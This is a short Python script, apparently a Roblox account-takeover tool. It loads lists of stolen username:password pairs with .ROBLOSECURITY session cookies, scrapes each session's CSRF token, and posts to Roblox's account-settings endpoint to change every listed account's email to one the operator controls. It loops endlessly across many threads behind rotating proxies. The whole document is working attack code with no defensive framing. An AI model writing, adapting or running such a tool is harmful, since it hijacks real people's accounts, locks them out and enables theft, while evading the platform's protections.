import requests, threading, random

with open('proxies.txt', 'r') as proxies:
    proxies = proxies.read().splitlines()

email = ""

def send(cookie, password):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.get('https://www.roblox.com/home').content.decode('utf8').split("Roblox.XsrfToken.setToken('")[1].split("');")[0]
            s = session.post('https://accountsettings.roblox.com/v1/email', data={'password':password, 'emailAddress':email, 'skipVerificationEmail':False}, proxies={'http':random.choice(proxies), 'https':random.choice(proxies)})
            print(s.content)
    except:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.get('https://www.roblox.com/home').content.decode('utf8').split("Roblox.XsrfToken.setToken('")[1].split("');")[0]
            s = session.post('https://accountsettings.roblox.com/v1/email', data={'password':password, 'emailAddress':email, 'skipVerificationEmail':False}, proxies=None)
            print(s.content)




with open('combos_cookies.txt') as cookies:
    cookies = cookies.read().splitlines()


while True:
    for cc in cookies:
        user_pass = cc.split('_|')[0]
        cookie = cc.split('_|')[1] 
        cookie = '_|' + cookie
        passw = user_pass.split(':')[1]
        threading.Thread(target=send,args=(cookie,passw,)).start()
